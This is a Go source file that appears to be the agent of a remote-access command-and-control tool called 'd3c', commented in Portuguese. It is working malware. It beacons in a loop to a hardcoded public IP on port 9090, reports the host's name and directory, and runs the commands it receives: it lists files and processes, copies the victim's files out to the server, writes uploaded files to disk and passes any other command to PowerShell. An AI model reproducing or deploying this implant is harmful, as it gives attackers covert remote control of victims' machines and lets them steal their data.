package main

import (
	"crypto/md5"
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"github.com/mitchellh/go-ps"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var (
	mensagem    estruturas.Mensagem
	tempoEspera = 5
)

const (
	SERVIDOR = "100.25.132.245"
	PORTA    = "9090"
)

func init() {
	mensagem.AgentHostname, _ = os.Hostname()
	mensagem.AgentCWD, _ = os.Getwd()
	mensagem.AgentID = geraID()
}

func main() {
	log.Println("Entrei em Execução")

	for {
		canal := contectaServidor()
		defer canal.Close()

		// Enviando a mensagem PARA o servidor
		gob.NewEncoder(canal).Encode(mensagem)
		mensagem.Comandos = []estruturas.Commando{}

		// Recebendo a mensagem DO servidor
		gob.NewDecoder(canal).Decode(&mensagem)

		if mensagemContemComandos(mensagem) {
			for indice, comando := range mensagem.Comandos {
				mensagem.Comandos[indice].Resposta = executaComando(comando.Comando, indice)
			}
		}
		time.Sleep(time.Duration(tempoEspera) * time.Second)
	}

}

func executaComando(comando string, indice int) (resposta string) {
	comandoSeparado := helpers.SeparaComando(comando)
	comandoBase := comandoSeparado[0]

	switch comandoBase {
	// ls, whoami, dir, tasklist
	case "ls":
		resposta = listaArquivos()
	case "pwd":
		resposta = listaDiretorioAtual()
	case "cd":
		if len(comandoSeparado[1]) > 0 {
			resposta = mudarDeDiretorio(comandoSeparado[1])
		}
	case "whoami":
		resposta = quemSouEu()
	case "ps":
		resposta = listaProcessos()
	case "send":
		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
	case "get":
		resposta = enviarArquivo(mensagem.Comandos[indice].Comando, indice)
	case "sleep":
		tempoEspera, _ = strconv.Atoi(strings.TrimSpace(comandoSeparado[1]))
	default:
		resposta = executaComandoEmShell(comando)
	}
	return resposta
}

func enviarArquivo(comandoGet string, indice int) (resposta string) {
	var err error
	resposta = "Arquivo enviado com sucesso!"
	comandoSeparado := helpers.SeparaComando(comandoGet)

	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
	if err != nil {
		resposta = "Erro ao copiar o arquivo: " + err.Error()
		mensagem.Comandos[indice].Arquivo.Erro = true
	}

	mensagem.Comandos[indice].Arquivo.Nome = comandoSeparado[1]

	return resposta
}

func salvaArquivoEmDisco(arquivo estruturas.Arquivo) (resposta string) {
	resposta = "Arquivo enviado com sucesso!"

	err := os.WriteFile(arquivo.Nome, arquivo.Conteudo, 0644)

	if err != nil {
		resposta = "Erro ao salvar arquivo no destino: " + err.Error()
	}

	return resposta
}

func executaComandoEmShell(comandoCompleto string) (resposta string) {

	if (runtime.GOOS) == "windows" {
		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()

		resposta = string(output)
	} else {
		resposta = "Sistema operacional alvo nao implementado para acesso ao shell."
	}

	return resposta
}

func listaProcessos() (processos string) {
	listaDeProcessos, _ := ps.Processes()

	for _, processo := range listaDeProcessos {
		processos += fmt.Sprintf("%d -> %d -> %s \n", processo.PPid(), processo.Pid(), processo.Executable())
	}

	return processos
}

func quemSouEu() (meuNome string) {
	usuario, _ := user.Current()
	meuNome = usuario.Username

	return meuNome
}
func mudarDeDiretorio(novoDiretorio string) (resposta string) {
	resposta = "Diretorio corrente alterado com sucesso!"
	err := os.Chdir(novoDiretorio)

	if err != nil {
		resposta = "O diretório " + novoDiretorio + " não existe."
	}

	return resposta
}

func listaDiretorioAtual() (diretorioAtual string) {
	diretorioAtual, _ = os.Getwd()
	return diretorioAtual
}

func listaArquivos() (resposta string) {
	arquivos, _ := ioutil.ReadDir(listaDiretorioAtual())

	for _, arquivo := range arquivos {
		resposta += arquivo.Name() + "\n"
	}

	println(resposta)
	return resposta
}

func mensagemContemComandos(mensagemDoServidor estruturas.Mensagem) (contem bool) {
	contem = false

	if len(mensagemDoServidor.Comandos) > 0 {
		contem = true
	}

	return contem
}

func contectaServidor() (canal net.Conn) {
	canal, _ = net.Dial("tcp", SERVIDOR+":"+PORTA)

	return canal
}

func geraID() string {
	myTime := time.Now().String()

	hasher := md5.New()
	hasher.Write([]byte(mensagem.AgentHostname + myTime))

	return hex.EncodeToString(hasher.Sum(nil))
}
